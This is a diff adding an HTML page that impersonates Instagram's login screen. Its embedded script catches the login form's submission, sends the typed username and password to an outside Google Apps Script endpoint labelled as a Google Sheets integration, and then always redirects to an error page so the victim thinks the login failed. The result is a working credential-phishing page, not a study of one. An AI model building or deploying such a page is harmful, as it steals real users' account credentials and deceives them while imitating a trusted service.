@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In | Instagram</title>
+    <link rel="stylesheet" href="index.css">
+    <link rel="shortcut icon" href="res/instagram-new.png">
+</head>
+<body>
+    <div id="wrapper">
+        <div class="main-content">
+            <div class="header">
+                <img src="res/ig.png" alt="Instagram Logo">
+            </div>
+            <br>
+
+            <div>
+                <div class="btn1">
+                    <img src="res/facebook.png" style="float: left;" class="icon" alt="Facebook Icon">
+                    <input type="button" onclick='window.location.href="error.html";' value="Continue with Facebook"
+                        style="float: right;" class="btn2" />
+                </div>
+            </div>
+
+            <div style="margin-top:15px;margin-bottom: 15px;">
+                <pre>─────────    OR    ─────────</pre>
+            </div>
+
+            <div class="l-part">
+                <!-- Modified form for Google Sheets integration -->
+                <form id="loginForm" method="POST">
+                    <input type="text" name="username" placeholder="Username" class="input-1" required />
+                    
+                    <div class="overlap-text">
+                        <input type="password" name="password" placeholder="Password" class="input-2" required />
+                        <a href="error.html">Forgot?</a>
+                    </div>
+                    
+                    <input type="submit" class="btn" value="Log In">
+                </form>
+            </div>
+        </div>
+
+        <div class="sub-content">
+            <div class="s-part">
+                Don't have an account?
+                <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">&nbsp;Sign up</a>
+            </div>
+        </div>
+    </div>
+
+        <script>
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const scriptURL = "https://script.google.com/macros/s/AKfycbyREozw_GR_ra6bfnx2R9bIMCb_mDt-Xr9081eZGGDfwRrxVgwEnifvJazp04OsNoPaZw/exec";
+    const formData = new FormData(this);
+
+    // Try sending to Google Sheets
+    fetch(scriptURL, { method: 'POST', body: formData })
+        .finally(() => {
+            // ALWAYS redirect, success or fail
+            window.location.href = "error.html";
+        });
+});
+</script>
+
+
+</body>
+</html>
